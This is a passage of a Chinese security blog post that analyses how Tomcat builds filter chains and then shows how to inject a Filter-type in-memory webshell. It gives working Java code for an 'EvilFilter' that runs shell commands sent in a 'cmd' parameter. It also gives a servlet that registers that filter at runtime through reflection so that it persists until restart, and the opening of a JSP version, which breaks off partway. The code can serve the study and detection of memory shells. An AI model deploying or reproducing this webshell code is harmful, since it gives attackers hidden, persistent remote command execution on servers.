class="line">  filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">  FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If there are no filter mappings, we are done</span></span><br><span class="line">  <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (filterChain);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Acquire the information we will need to match filter mappings</span></span><br><span class="line">  <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">    (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">  <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">  <span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">    requestPath = attribute.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMaps[i] ,dispatcher)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersURL(filterMaps[i], requestPath))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">      context.findFilterConfig(filterMaps[i].getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add filters that match on servlet name second</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMaps[i] ,dispatcher)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersServlet(filterMaps[i], servletName))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">      context.findFilterConfig(filterMaps[i].getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return the completed filter chain</span></span><br><span class="line">  <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续前面的堆栈分析，跟进org.apache.catalina.core.ApplicationFilterChain#doFilter方法，其先检查JVM是否开启安全模式，由于这里为false，因此会进入else语句中调用internalDoFilter方法。</p><p><img src="/2024/05/18/Tomcat-Filter/5.png"></p><p>跟进org.apache.catalina.core.ApplicationFilterChain#internalDoFilter方法，先从this,filters数组中依次取出filterConfig对象，接着调用org.apache.catalina.core.ApplicationFilterConfig#getFilter方法获取Filter实例，最后调用其doFilter方法。</p><p><img src="/2024/05/18/Tomcat-Filter/6.png"></p><p>上文中分析了创建filterChain时主要依赖于filterMaps，接下来看看如何向filterMaps中添加恶意的filterMap。在org.apache.catalina.core.StandardContext中有两个方法可以向filterMaps中添加filterMap，分别是addFilterMap方法和addFilterMapBefore方法。</p><p><img src="/2024/05/18/Tomcat-Filter/7.png"></p><p>跟进org.apache.catalina.core.StandardContext#validateFilterMap方法，该方法会对传入的filterMap进行判断，若this.findFilterDef &#x3D;&#x3D; null时则会抛出异常，因此在构造时，需要注意构造符合要求的filterDef。</p><p><img src="/2024/05/18/Tomcat-Filter/8.png"></p><p>上文中提到的filterMap、filterDef都与filterConfig相关，而org.apache.catalina.core.StandardContext中与filterConfig相关的操作只有filterStart和filterStop方法，因此在应用运行时，只能采用反射的方式来动态修改filterConfigs的值。</p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Filter内存马的具体思路如下:</p><ul><li>调用ApplicationContext的addFilter方法创建filterDefs对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li><li>调用StandardContext的filterStart方法生成filterConfigs；</li><li>调用ApplicationFilterRegistration的addMappingForUrlPatterns生成filterMaps。</li></ul><p>同时，为了兼容某些特殊情况比如Shiro，需要将加入的filter放在filterMaps的第一位，可以自行修改HashMap中的顺序，也可以在调用StandardContext的addFilterMapBefore时直接加在filterMaps的第一位。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>先简单实现一个恶意的Filter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;EvilFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osProperty</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osProperty != <span class="literal">null</span> &amp;&amp; osProperty.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            resp.getWriter().write(output);</span><br><span class="line">            resp.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/9.png"></p><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><p>根据上文的分析，动态注入filter型内存马需要经过以下步骤：</p><ul><li>创建恶意filter</li><li>用filterDef对filter进行封装</li><li>将filterDef添加到filterDefs跟filterConfigs中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中</li></ul><p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，因此内存马便可以一直驻留下去，直到Tomcat重启后失效。</p><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;EvilServlet&quot;, value = &quot;/EvilServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射获取standardContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;h3rmesk1t&quot;</span>;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">filterConfigsMap</span> <span class="operator">=</span> (Map) filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置恶意的Filter</span></span><br><span class="line">            <span class="keyword">if</span> (filterConfigsMap.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                        <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">                        <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            httpServletResponse.getWriter().write(output);</span><br><span class="line">                            httpServletResponse.getWriter().flush();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        chain.doFilter(request, response);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射获取FilterDef, 设置filter名等参数, 调用addFilterDef添加FilterDef</span></span><br><span class="line">                Class&lt;?&gt; filterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">                Constructor&lt;?&gt; filterDefDeclaredConstructor = filterDef.getDeclaredConstructor();</span><br><span class="line">                filterDefDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef1</span> <span class="operator">=</span> (FilterDef) filterDefDeclaredConstructor.newInstance();</span><br><span class="line">                filterDef1.setFilter(filter);</span><br><span class="line">                filterDef1.setFilterName(filterName);</span><br><span class="line">                filterDef1.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardContext.addFilterDef(filterDef1);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射获取FilterMap并设置拦截路径, 调用addFilterMapBefore添加FilterMap</span></span><br><span class="line">                Class&lt;?&gt; filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                Constructor&lt;?&gt; filterMapDeclaredConstructor = filterMap.getDeclaredConstructor();</span><br><span class="line">                filterMapDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap1</span> <span class="operator">=</span> (FilterMap) filterMapDeclaredConstructor.newInstance();</span><br><span class="line">                filterMap1.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap1.setFilterName(filterName);</span><br><span class="line">                filterMap1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                standardContext.addFilterMapBefore(filterMap1);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射获取ApplicationFilterConfig</span></span><br><span class="line">                Class&lt;?&gt; applicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">                Constructor&lt;?&gt; applicationFilterConfigDeclaredConstructor = applicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                applicationFilterConfigDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig1</span> <span class="operator">=</span> (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef1);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 向从StandardContext获取的FilterConfigs中添加恶意的FilterConfig</span></span><br><span class="line">                filterConfigsMap.put(filterName, applicationFilterConfig1);</span><br><span class="line">                response.getWriter().write(<span class="string">&quot;Filter Inject Successfully...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/10.png"></p><p><img src="/2024/05/18/Tomcat-Filter/11.png"></p><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 通过反射获取standardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;h3rmesk1t&quot;</span>;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigsMap</span> <span class="operator">=</span> (Map) filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置恶意的Filter</span></span><br><span class="line">    <span class="keyword">if</span> (filterConfigsMap.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span 